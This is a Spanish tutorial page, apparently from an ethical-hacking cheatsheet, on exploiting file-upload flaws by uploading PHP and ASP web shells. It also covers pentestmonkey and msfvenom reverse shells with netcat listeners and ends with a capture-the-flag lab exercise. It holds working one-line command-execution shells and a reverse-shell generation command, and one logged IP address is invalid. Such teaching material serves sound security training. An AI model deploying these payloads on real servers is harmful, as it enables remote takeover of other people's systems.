
# Explotación de subida

El paso final para explotar esta aplicación web es cargar el script malicioso en el mismo lenguaje que la aplicación web, como un [webshell](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/webshells.md) o una [reverse shell](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/shells-y-payloads/reverse-shells.md). Una vez que cargamos nuestro script malicioso y visitamos su enlace, deberíamos poder interactuar con él para tomar el control del servidor back-end.

***

## <mark style="color:purple;">Web Shell</mark>

Podemos encontrar muchos shells web excelentes en internet que brindan funciones útiles, como navegación de directorios o transferencia de archivos. Una buena opción para `PHP` es [phpbash](https://github.com/Arrexel/phpbash) , que proporciona un shell web semiinteractivo similar a una terminal. Además, [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) proporciona una gran cantidad de webshells para diferentes marcos e idiomas, que se pueden encontrar en el `/usr/share/seclists/Web-Shells` directorio.

```shell-session
afsh4ck@kali$ sudo apt-get install seclists
afsh4ck@kali$ cd /usr/share/seclists/Web-Shells 

afsh4ck@kali$ ls
backdoor_list.txt    JSP             PHP
CFM                  laudanum-1.0    Vtiger
FuzzDB               Magento         WordPress
```

Podemos descargar cualquiera de estos webshells para el lenguaje de nuestra aplicación web ( `PHP` en nuestro caso), luego cargarlo a través de la función de carga vulnerable y visitar el archivo cargado para interactuar con el web shell. Por ejemplo, intentemos cargar `phpbash.php` desde [phpbash](https://github.com/Arrexel/phpbash) a nuestra aplicación web y luego naveguemos hasta su enlace haciendo clic en el botón Download:

<figure><img src="https://academy.hackthebox.com/storage/modules/136/file_uploads_php_bash.jpg" alt=""><figcaption></figcaption></figure>

Como podemos ver, este shell web ofrece una experiencia similar a la de una terminal, lo que hace que sea muy fácil enumerar el servidor back-end para su posterior explotación. Pruebe algunos otros shells web de SecLists y vea cuáles satisfacen mejor sus necesidades.

***

### Cómo escribir un Web Shell personalizado

Si bien el uso de web shells de recursos en línea puede brindar una gran experiencia, también deberíamos saber cómo escribir un web shell simple de forma manual. Esto se debe a que es posible que no tengamos acceso a herramientas en línea durante algunas pruebas de penetración, por lo que debemos poder crear una cuando sea necesario.

Por ejemplo, con `PHP`aplicaciones web, podemos usar la `system()`función que ejecuta comandos del sistema e imprime su salida, y pasarle el `cmd`parámetro con `$_REQUEST['cmd']`, de la siguiente manera:

Código: php

```php
<?php system($_REQUEST['cmd']); ?>
```

Si escribimos el script anterior `shell.php`y lo cargamos en nuestra aplicación web, podemos ejecutar comandos del sistema con el `?cmd=`parámetro GET (por ejemplo `?cmd=id`, ), de la siguiente manera:

&#x20;  ![](https://academy.hackthebox.com/storage/modules/136/file_uploads_php_manual_shell.jpg)

Puede que no sea tan fácil de usar como otros shells web que podemos encontrar en línea, pero aun así proporciona un método interactivo para enviar comandos y recuperar su resultado. Podría ser la única opción disponible durante algunas pruebas de penetración web.

Consejo: si estamos usando este shell web personalizado en un navegador, puede ser mejor usar source-view haciendo clic en `[CTRL+U]`, ya que source-view muestra la salida del comando tal como se mostraría en la terminal, sin ninguna representación HTML que pueda afectar el formato de la salida.

Los shells web no son exclusivos de `PHP`, y lo mismo se aplica a otros frameworks web, con la única diferencia de las funciones que se utilizan para ejecutar comandos del sistema. Para `.NET`las aplicaciones web, podemos pasar el `cmd`parámetro con `request('cmd')`a la `eval()`función, y también debería ejecutar el comando especificado en `?cmd=`e imprimir su salida, de la siguiente manera:

```asp
<% eval request('cmd') %>
```

Podemos encontrar otros shells web en línea, muchos de los cuales se pueden memorizar fácilmente para realizar pruebas de penetración web. Cabe señalar que `in certain cases, web shells may not work`. Esto puede deberse a que el servidor web impide el uso de algunas funciones utilizadas por el shell web (por ejemplo `system()`), o debido a un firewall de aplicaciones web, entre otras razones. En estos casos, es posible que necesitemos utilizar técnicas avanzadas para eludir estas mitigaciones de seguridad, pero esto está fuera del alcance de este módulo.

***

## Reverse Shell

Por último, veamos cómo podemos recibir shells inversos a través de la funcionalidad de carga vulnerable. Para ello, debemos comenzar descargando un script de shell inverso en el lenguaje de la aplicación web. Un shell inverso confiable `PHP`es el shell inverso PHP de [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) . Además, las mismas [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) que mencionamos anteriormente también contienen scripts de shell inverso para varios lenguajes y marcos web, y podemos utilizar cualquiera de ellos para recibir un shell inverso también.

Descarguemos uno de los scripts de shell inverso anteriores, como [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell) , y luego abrámoslo en un editor de texto para ingresar nuestro `IP`y listening `PORT`, al que se conectará el script. Para el `pentestmonkey`script, podemos modificar las líneas `49`y `50`e ingresar la IP/PUERTO de nuestra máquina:

```php
$ip = 'OUR_IP';     // CHANGE THIS
$port = OUR_PORT;   // CHANGE THIS
```

A continuación, podemos iniciar un `netcat`oyente en nuestra máquina (con el puerto anterior), cargar nuestro script a la aplicación web y luego visitar su enlace para ejecutar el script y obtener una conexión de shell inversa:

```shell-session
afsh4ck@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [188.166.173.208] 35232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Como podemos ver, hemos recibido una conexión exitosa desde el servidor back-end que aloja la aplicación web vulnerable, lo que nos permite interactuar con ella para explotarla más. El mismo concepto se puede utilizar para otros lenguajes y frameworks web, con la única diferencia que es el script de shell inverso que utilizamos.

***

### Reverse Shells con MSFVenom

Al igual que los web shells, también podemos crear nuestros propios scripts de shell inverso. Si bien es posible utilizar la misma `system`función anterior y pasarle un comando de shell inverso, esto puede no ser siempre muy confiable, ya que el comando puede fallar por muchas razones, al igual que cualquier otro comando de shell inverso.

Por eso siempre es mejor utilizar las funciones básicas del framework web para conectarnos a nuestra máquina. Sin embargo, esto puede no ser tan fácil de memorizar como un script de shell web. Afortunadamente, herramientas como `msfvenom`pueden generar un script de shell inverso en muchos lenguajes e incluso pueden intentar eludir ciertas restricciones vigentes. Podemos hacerlo de la siguiente manera `PHP`:

```shell-session
afsh4ck@htb[/htb]$ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

Una vez generado nuestro `reverse.php`script, podemos volver a iniciar un `netcat`receptor en el puerto que especificamos anteriormente, cargar el `reverse.php`script y visitar su enlace, y también deberíamos recibir un shell inverso:

```shell-session
afsh4ck@htb[/htb]$ nc -lvnp OUR_PORT
listening on [any] OUR_PORT ...
connect to [OUR_IP] from (UNKNOWN) [181.151.182.286] 56232
# id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

De manera similar, podemos generar scripts de shell inverso para varios idiomas. Podemos usar muchas cargas útiles de shell inverso con el `-p`indicador y especificar el idioma de salida con el `-f`indicador.

Si bien los shells inversos siempre son preferibles a los shells web, ya que brindan el método más interactivo para controlar el servidor comprometido, es posible que no siempre funcionen y que tengamos que recurrir a los shells web. Esto puede deberse a varias razones, como tener un firewall en la red back-end que impide las conexiones salientes o si el servidor web deshabilita las funciones necesarias para iniciar una conexión con nosotros.

***

## Caso práctico

Intente aprovechar la función de carga para cargar un shell web y obtener el contenido de /flag.txt

```
Objetivo: http://94.237.59.63:38185/
```

<figure><img src="/files/rcWjydToVjFpoY2a4YZd" alt=""><figcaption></figcaption></figure>

Vamos a cargar la webshell [phpbash](https://github.com/Arrexel/phpbash):

<figure><img src="/files/yLHgeGpQaszy1mlGsDbs" alt=""><figcaption></figcaption></figure>

Se sube correctamente, y si accedemos al directorio `/uploads/phpbash.php` podemos ejecutar comandos, y obtenemos la flag en el directorio raiz `/`:

<figure><img src="/files/uKYhVFQPYOuH8czLr80p" alt=""><figcaption></figcaption></figure>
